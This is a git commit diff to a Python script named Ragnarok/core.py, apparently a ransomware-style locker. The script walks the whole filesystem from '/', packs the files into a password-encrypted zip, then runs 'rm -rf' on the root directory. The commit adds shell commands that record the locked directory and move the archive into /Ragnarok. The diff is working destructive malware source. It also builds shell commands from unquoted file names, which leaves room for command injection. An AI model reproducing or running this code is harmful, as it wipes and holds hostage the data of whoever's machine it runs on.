eda14d2c0f68ee0b917b71d03849126d1a635c63
Sam Burton <sam.burton271@gmail.com>
2024-09-18 14:59:40 -0400

    Added way to save the directory being locked

--- Ragnarok/core.py
+++ Ragnarok/core.py
@@ -1,7 +1,9 @@
 import os
 import sys
 import subprocess
-
+self = sys.argv[0]
+num = (len(self) - 1) - 7
+selfPath = self[:num]
 origin = "/" #This will set the highest directory with which to lock down
 def main():
     fileList = findFiles(origin)
@@ -9,6 +11,10 @@ def main():
     #randLock(fileList)
     
     os.system("rm -rf " + origin)
+    os.system("mkdir /Ragnarok")
+    os.system("touch /Ragnarok/directory")
+    os.system('echo "' + origin + '" >> /Ragnarok/directory')
+    os.system("mv " + selfPath + "Ragnarok.zip /Ragnarok/zip.zip")
     
 def randLock(fileList):
     for file in fileList:
@@ -23,10 +29,8 @@ def zipLock(fileList):
     command = "zip -e Ragnarok.zip "
     for file in fileList:
         command = command + file + " "
-        
     os.system(command)
 def findFiles(origin):
-    self = str(sys.argv[0])
     excludedFiles = [self, "/bin/cat", "/bin/echo"]
     fileList = []
     for root, dirs, files in os.walk(origin):
